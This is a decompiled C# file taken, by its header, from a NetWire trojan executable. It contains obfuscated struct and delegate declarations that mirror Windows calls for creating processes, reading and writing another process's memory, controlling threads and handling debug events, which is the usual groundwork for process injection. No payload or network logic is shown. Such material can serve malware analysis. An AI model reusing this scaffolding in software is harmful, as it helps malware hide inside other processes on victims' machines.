// Decompiled with JetBrains decompiler
// Type: #t.#u
// Assembly: u1rug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=dbb94034cbd6bbd6
// MVID: C8A082E9-30A2-423A-BCDF-59565BB76FBE
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.NetWire.gen-baba76d578be903c9d78e3d6417636ba6a8069cafe9ccccdfce2bc19b43fc299.exe

using \u0023t;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0023t
{
  internal sealed class \u0023u
  {
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct \u0023J
    {
      public IntPtr \u0023F;
      public IntPtr \u0023G;
      public uint \u0023H;
      private uint \u0023I;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct \u0023T
    {
      public uint \u0023K;
      private string \u0023L;
      private string \u0023M;
      private string \u0023N;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
      private byte[] \u0023O;
      private IntPtr \u0023P;
      private IntPtr \u0023Q;
      private IntPtr \u0023R;
      private IntPtr \u0023S;
    }

    public struct \u00230
    {
      public \u0023u.\u0023jb \u0023U;
      public int \u0023V;
      public int \u0023W;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 86, ArraySubType = UnmanagedType.U1)]
      public byte[] \u0023X;

      [SpecialName]
      public \u0023u.\u00239 \u0023Y() => this.\u0023Z<\u0023u.\u00239>();

      private \u0023p \u0023Z<\u0023p>() where \u0023p : struct
      {
        int num = Marshal.SizeOf(typeof (\u0023p));
        object objectValue;
        do
        {
          IntPtr ptr = Marshal.AllocHGlobal(num);
          if (true)
            goto label_10;
label_3:
          Type structureType = typeof (\u0023p);
          objectValue = RuntimeHelpers.GetObjectValue(Marshal.PtrToStructure(ptr, structureType));
label_4:
          IntPtr destination;
          IntPtr hglobal = destination;
          if (false)
          {
            ptr = hglobal;
            goto label_3;
          }
          else
            Marshal.FreeHGlobal(hglobal);
label_6:
          continue;
label_10:
          destination = ptr;
          Marshal.Copy(this.\u0023X, 0, destination, num);
          if (true)
          {
            if (true)
            {
              ptr = destination;
              goto label_3;
            }
            else
              goto label_4;
          }
          else
            goto label_6;
        }
        while (false);
        return (\u0023p) objectValue;
      }
    }

    public struct \u00237
    {
      public uint \u00231;
      public uint \u00232;
      public IntPtr \u00233;
      public IntPtr \u00234;
      public uint \u00235;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
      public uint[] \u00236;
    }

    public struct \u00239
    {
      public \u0023u.\u00237 \u00233;
      public uint \u00238;
    }

    public enum \u0023jb
    {
      \u0023hb = 1,
      \u0023eb = 2,
      \u0023db = 3,
      \u0023ab = 4,
      \u0023ib = 5,
      \u0023bb = 6,
      \u0023gb = 7,
      \u0023cb = 8,
      \u0023fb = 9,
    }

    public delegate bool \u0023kb([In] IntPtr obj0, [In] uint obj1, [In] int obj2, [In] uint obj3, [In] ref uint obj4);

    public delegate bool \u0023lb(
      [In] string obj0,
      [In] string obj1,
      [In] IntPtr obj2,
      [In] IntPtr obj3,
      [In] bool obj4,
      [In] uint obj5,
      [In] IntPtr obj6,
      [In] string obj7,
      [In] ref \u0023u.\u0023T obj8,
      [In] ref \u0023u.\u0023J obj9);

    public delegate bool \u0023mb([In] IntPtr obj0, [In] int obj1, [In] ref int obj2, [In] int obj3, [In] ref int obj4);

    public delegate bool \u0023nb([In] IntPtr obj0, [In] int obj1, [In] byte[] obj2, [In] int obj3, [In] ref int obj4);

    public delegate bool \u0023ob([In] IntPtr obj0, [In] int[] obj1);

    public delegate uint \u0023pb([In] IntPtr obj0, [In] int[] obj1);

    public delegate int \u0023qb([In] IntPtr obj0, [In] int obj1);

    public delegate int \u0023rb([In] IntPtr obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] int obj4);

    public delegate int \u0023sb(IntPtr handle, out uint SuspendCount);

    public delegate bool \u0023tb([In] int obj0);

    public delegate bool \u0023ub(out \u0023u.\u00230 lpDebugEvent, int dwMilliseconds);

    public delegate bool \u0023vb([In] bool KillOnExit);

    public delegate bool \u0023wb([In] int obj0, [In] int obj1, [In] int obj2);
  }
}
